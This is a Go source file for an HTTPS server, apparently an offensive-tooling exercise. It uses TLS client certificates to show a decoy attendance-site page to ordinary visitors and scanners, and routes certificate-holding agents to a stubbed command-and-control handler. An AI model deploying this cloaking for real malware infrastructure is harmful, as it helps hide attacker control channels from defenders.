package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
)

func main() {
	certFile, keyFile, caFile := tlsFiles()

	// Load the rklings CA certificate for verifying agent certs
	caPEM, err := os.ReadFile(caFile)
	if err != nil {
		log.Fatalf("read CA cert: %v", err)
	}
	caPool := x509.NewCertPool()
	if !caPool.AppendCertsFromPEM(caPEM) {
		log.Fatal("failed to parse CA cert")
	}

	// Load server TLS certificate and key
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("load server cert: %v", err)
	}

	// RequestClientCert: ask ALL clients for a cert, but don't reject those
	// that send nothing. Browsers silently respond empty. TLS 1.3 encrypts
	// the CertificateRequest, so middleboxes never see it.
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
		ClientAuth:   tls.RequestClientCert,
		ClientCAs:    caPool,
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// Three outcomes: no cert, wrong cert, right cert.
		if r.TLS == nil || len(r.TLS.PeerCertificates) == 0 {
			serveDecoy(w, r)
			return
		}

		// Client sent a cert. Verify it against the rklings CA manually.
		// We used RequestClientCert (not RequireAndVerify), so Go did not
		// verify it for us.
		peer := r.TLS.PeerCertificates[0]
		opts := x509.VerifyOptions{
			Roots:     caPool,
			KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		}
		if _, err := peer.Verify(opts); err != nil {
			// Wrong cert (not signed by our CA): decoy.
			serveDecoy(w, r)
			return
		}

		// Valid agent cert. Route to C2.
		serveC2(w, r)
	})

	srv := &http.Server{
		Addr:      listenAddr(),
		TLSConfig: tlsCfg,
		Handler:   mux,
	}

	log.Printf("listening on %s", srv.Addr)
	log.Fatal(srv.ListenAndServeTLS("", ""))
}

func tlsFiles() (string, string, string) {
	if len(os.Args) == 4 {
		return os.Args[1], os.Args[2], os.Args[3]
	}
	return "server.crt", "server.key", "ca.crt"
}

func listenAddr() string {
	if addr := os.Getenv("RKLINGS_LISTEN_ADDR"); addr != "" {
		return addr
	}
	return ":443"
}

// serveDecoy writes a plausible static website page.
func serveDecoy(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `<!DOCTYPE html>
<html><head><title>EduSigh</title></head>
<body><h1>Attendance, powered by one heroic administrator.</h1>
<p>Pedro is resending your signature email. Please keep your QR code ready.</p></body>
</html>`)
}

// serveC2 handles authenticated agent requests.
func serveC2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":  "ok",
		"channel": "c2",
	})
}
